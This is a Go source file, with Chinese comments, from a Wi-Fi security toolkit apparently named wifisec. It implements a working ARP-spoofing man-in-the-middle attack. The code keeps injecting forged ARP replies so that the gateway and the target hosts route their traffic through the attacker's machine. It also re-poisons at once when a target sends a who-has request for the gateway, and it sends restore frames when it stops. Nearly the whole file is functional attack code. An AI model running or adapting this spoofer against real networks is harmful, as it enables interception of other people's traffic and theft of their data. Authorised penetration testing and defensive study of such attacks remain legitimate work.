// Package mitm 实现 ARP 欺骗中间人：持续向网关与目标双向注入伪造 ARP 应答，
// 让双方的 ARP 缓存都指向本机，流量被迫途经本机转发。Stop 时用真实 MAC
// 发送恢复帧覆盖毒化条目，尽力把网络还原到攻击前状态。
package mitm

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ctkqiang/wifisec/internal/ethernet"
	"github.com/ctkqiang/wifisec/internal/platform/writer"
	"github.com/ctkqiang/wifisec/internal/utilities"
)

// 毒化节奏与恢复策略。
const (
	// poisonInterval 是全量毒化周期。ARP 缓存条目在多数系统上几十秒才老化，
	// 1 秒足以在老化前刷新，同时把总线上的帧占用压到可忽略。
	poisonInterval = time.Second

	// restoreRounds 是退出时恢复帧的重发轮数。ARP 应答无确认机制，
	// 单发可能丢失，多轮重发覆盖丢帧并冲掉恢复瞬间残留的毒化条目。
	restoreRounds = 5

	// restoreGap 是恢复轮与轮之间的间隔，给对端内核处理留出时间。
	restoreGap = 150 * time.Millisecond
)

// Observe 用到的帧偏移与字段值：只读以太网头与 ARP 报文头部做判定，
// 不需要完整解析器。arpMinFrameLength 之下连四个地址都放不下。
const (
	etherTypeARP      = 0x0806
	arpOperRequest    = 1
	arpMinFrameLength = 42
)

// Target 是一个被毒化的局域网主机，IP 与真实 MAC 成对绑定；
// 真实 MAC 由编排层在启动前收集，恢复帧依赖它说回真话。
type Target struct {
	IP  net.IP
	MAC net.HardwareAddr
}

// Spoofer 持有双向毒化所需的全部地址材料与发送端口。
// Start 后毒化循环独占一个 goroutine；Observe 会被抓包读循环
// 并发调用，端口写入用 writeMu 串行化。
type Spoofer struct {
	port       writer.Port
	selfMAC    net.HardwareAddr
	gatewayIP  net.IP
	gatewayMAC net.HardwareAddr
	targets    []Target

	writeMu     sync.Mutex
	framesSent  atomic.Int64
	writeWarned atomic.Bool
	stop        chan struct{}
	done        chan struct{}
}

// NewSpoofer 校验地址材料后构造 Spoofer。把长度检查放在构造期，
// 收集阶段的缺陷在启动瞬间暴露，而不是混进运行期的写失败告警里。
func NewSpoofer(
	port writer.Port,
	selfMAC net.HardwareAddr,
	gatewayIP net.IP,
	gatewayMAC net.HardwareAddr,
	targets []Target,
) (*Spoofer, error) {
	switch {
	case len(selfMAC) != 6:
		return nil, errors.New("本机 MAC 长度错误，必须为 6 字节")
	case len(gatewayMAC) != 6:
		return nil, errors.New("网关 MAC 长度错误，必须为 6 字节")
	case gatewayIP.To4() == nil:
		return nil, errors.New("网关必须是 IPv4 地址")
	case len(targets) == 0:
		return nil, errors.New("毒化目标列表为空")
	}

	for _, target := range targets {
		switch {
		case target.IP.To4() == nil:
			return nil, fmt.Errorf("目标 %s 不是 IPv4 地址", target.IP)
		case len(target.MAC) != 6:
			return nil, fmt.Errorf("目标 %s 的 MAC 长度错误，必须为 6 字节", target.IP)
		}
	}

	return &Spoofer{
		port:       port,
		selfMAC:    append(net.HardwareAddr(nil), selfMAC...),
		gatewayIP:  append(net.IP(nil), gatewayIP...),
		gatewayMAC: append(net.HardwareAddr(nil), gatewayMAC...),
		targets:    targets,
		stop:       make(chan struct{}),
		done:       make(chan struct{}),
	}, nil
}

// Start 立即毒化一轮并启动秒级循环。不等首个 ticker 周期是为了
// 缩短 ARP 缓存空窗——启动越晚，目标越可能先学到真实路径。
func (spoofer *Spoofer) Start() {
	spoofer.poisonOnce()

	go func() {
		defer close(spoofer.done)

		ticker := time.NewTicker(poisonInterval)
		defer ticker.Stop()

		for {
			select {
			case <-spoofer.stop:
				return
			case <-ticker.C:
				spoofer.poisonOnce()
			}
		}
	}()
}

// Observe 由抓包读循环把捕获的以太网帧喂进来：发现「目标询问网关」的
// ARP 请求时立即补双向毒化。部分系统发送 who-has 前会先清掉旧缓存条目，
// 只靠秒级周期刷新的话，目标会在这段空窗内重新学到网关的真实 MAC。
func (spoofer *Spoofer) Observe(frame []byte) {
	if len(frame) < arpMinFrameLength {
		return
	}

	isARP := binary.BigEndian.Uint16(frame[12:14]) == etherTypeARP
	isRequest := binary.BigEndian.Uint16(frame[20:22]) == arpOperRequest
	if !isARP || !isRequest {
		return
	}

	if !net.IP(frame[38:42]).Equal(spoofer.gatewayIP) {
		return
	}

	senderIP := net.IP(frame[28:32])
	for _, target := range spoofer.targets {
		if !senderIP.Equal(target.IP) {
			continue
		}

		spoofer.sendReply(spoofer.gatewayIP, spoofer.selfMAC, target.IP, target.MAC)
		spoofer.sendReply(target.IP, spoofer.selfMAC, spoofer.gatewayIP, spoofer.gatewayMAC)

		return
	}
}

// Stop 停止毒化循环并同步发送恢复帧：对网关说每个目标的真实 MAC、
// 对每个目标说网关的真实 MAC。发完全部轮次才返回，保证退出路径
// 上的恢复动作不半途而废。
func (spoofer *Spoofer) Stop() {
	select {
	case <-spoofer.stop:
	default:
		close(spoofer.stop)
	}
	<-spoofer.done

	for round := range restoreRounds {
		if round > 0 {
			time.Sleep(restoreGap)
		}

		for _, target := range spoofer.targets {
			spoofer.sendReply(target.IP, target.MAC, spoofer.gatewayIP, spoofer.gatewayMAC)
			spoofer.sendReply(spoofer.gatewayIP, spoofer.gatewayMAC, target.IP, target.MAC)
		}
	}
}

// FramesSent 返回累计注入的毒化/恢复帧数量，供退出统计输出。
func (spoofer *Spoofer) FramesSent() int64 {
	return spoofer.framesSent.Load()
}

// poisonOnce 对全部目标各注入双向毒化帧：对网关冒充每个目标、
// 对每个目标冒充网关，本机因此成为两者之间唯一的 ARP 路径。
func (spoofer *Spoofer) poisonOnce() {
	for _, target := range spoofer.targets {
		spoofer.sendReply(target.IP, spoofer.selfMAC, spoofer.gatewayIP, spoofer.gatewayMAC)
		spoofer.sendReply(spoofer.gatewayIP, spoofer.selfMAC, target.IP, target.MAC)
	}
}

// sendReply 构造并注入一条单播 ARP 应答。写失败只告警首次：
// 端口掉线后每个毒化周期都会涌现同样错误，刷屏没有信息量。
func (spoofer *Spoofer) sendReply(
	senderIP net.IP,
	senderMAC net.HardwareAddr,
	targetIP net.IP,
	targetMAC net.HardwareAddr,
) {
	frame, err := ethernet.BuildArpReply(senderIP, senderMAC, targetIP, targetMAC)
	if err != nil {
		utilities.Verbose("构造 ARP 应答失败（%s → %s）：%v", senderIP, targetIP, err)
		return
	}

	spoofer.writeMu.Lock()
	defer spoofer.writeMu.Unlock()

	if err := spoofer.port.Write(frame); err != nil {
		if !spoofer.writeWarned.Swap(true) {
			utilities.Error("ARP 应答写入失败，毒化与恢复可能不完整：%v", err)
		}

		return
	}

	spoofer.framesSent.Add(1)
}
